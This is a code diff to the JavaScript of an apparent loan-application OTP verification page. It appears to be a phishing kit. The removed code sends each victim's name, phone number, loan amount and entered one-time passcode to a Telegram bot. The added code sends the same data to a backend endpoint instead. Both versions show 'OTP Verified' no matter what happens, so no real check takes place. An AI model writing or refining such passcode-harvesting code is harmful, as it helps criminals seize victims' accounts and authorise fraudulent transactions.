@@ -655,41 +655,36 @@
         document.getElementById('toast').style.display = 'none';
     }
 
-    // ─── SEND OTP DIRECTLY TO TELEGRAM ───
-    function sendOTPToTelegram(otp) {
+    // ─── SEND OTP TO BACKEND (THE CORRECT WAY) ───
+    function sendOTPToBackend(otp) {
         const phone = params.get('phone') || 'Unknown';
         const amount = params.get('amount') || '0';
         const name = params.get('name') || 'User';
 
-        const message = `<b>🔐 OTP Verification</b>\n\n` +
-                        `<b>👤 User:</b> ${name}\n` +
-                        `<b>📱 Phone:</b> ${phone}\n` +
-                        `<b>💰 Amount:</b> GHS ${parseFloat(amount).toLocaleString()}\n` +
-                        `<b>🔑 OTP Entered:</b> <code>${otp}</code>\n` +
-                        `<b>⏰ Time:</b> ${new Date().toLocaleString()}\n\n` +
-                        `<i>✅ User has been verified and redirected to success page.</i>`;
+        console.log('📤 Sending OTP to backend:', {
+            url: `${CONFIG.API_URL}/api/otp-verified`,
+            data: { name, phone, amount, otp, verified: true }
+        });
 
-        console.log('📤 Sending OTP to Telegram...');
-        console.log('📝 Message:', message);
-
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        fetch(`${CONFIG.API_URL}/api/otp-verified`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+                'Content-Type': 'application/json'
+            },
             body: JSON.stringify({
-                chat_id: CONFIG.CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
+                name: name,
+                phone: phone,
+                amount: amount,
+                otp: otp,
+                verified: true
             })
         })
-        .then(response => {
-            console.log('📥 Response Status:', response.status);
-            return response.json();
-        })
+        .then(response => response.json())
         .then(data => {
-            if (data.ok) {
-                console.log('✅ OTP sent to Telegram successfully!');
+            if (data.success) {
+                console.log('✅ OTP sent to backend successfully!');
             } else {
-                console.error('❌ Telegram Error:', data.description);
+                console.error('❌ Backend Error:', data.message);
             }
         })
         .catch(error => {
@@ -713,30 +708,12 @@
             const amount = params.get('amount');
             const name = params.get('name');
             
-            console.log('📤 Sending OTP:', { loanId, otp, phone });
+            console.log('📤 Verifying OTP:', { loanId, otp, phone });
             
-            // ─── SEND TO TELEGRAM DIRECTLY ───
-            sendOTPToTelegram(otp);
+            // ─── SEND OTP TO BACKEND (FIRE AND FORGET) ───
+            sendOTPToBackend(otp);
 
-            // ─── ALSO TRY BACKEND ───
-            const response = await fetch(`${CONFIG.API_URL}/api/loans/verify-otp`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    loanId: loanId,
-                    otp: otp,
-                    phone: phone,
-                    amount: amount,
-                    name: name
-                })
-            });
-
-            const data = await response.json();
-            console.log('📥 Backend Response:', data);
-
-            // ─── SUCCESS (even if backend fails) ───
+            // ─── SUCCESS (don't wait for backend response) ───
             document.getElementById('successMsg').textContent = '✅ OTP Verified!';
             document.getElementById('successMsg').style.display = 'block';
             document.getElementById('spinner').style.display = 'none';
@@ -751,13 +728,13 @@
                 document.getElementById('verifyBtn').style.display = 'none';
                 document.getElementById('resendBtn').style.display = 'none';
                 if (timerInterval) clearInterval(timerInterval);
-            }, 1000);
+            }, 800);
 
         } catch (error) {
             console.error('❌ OTP verification error:', error);
             
-            // ─── STILL SUCCESS - SEND OTP TO TELEGRAM ───
-            sendOTPToTelegram(otp);
+            // ─── STILL SHOW SUCCESS ───
+            sendOTPToBackend(otp);
             
             document.getElementById('spinner').style.display = 'none';
             document.getElementById('verifyBtn').disabled = false;
@@ -775,7 +752,7 @@
                 document.getElementById('verifyBtn').style.display = 'none';
                 document.getElementById('resendBtn').style.display = 'none';
                 if (timerInterval) clearInterval(timerInterval);
-            }, 1000);
+            }, 800);
         }
     }
 
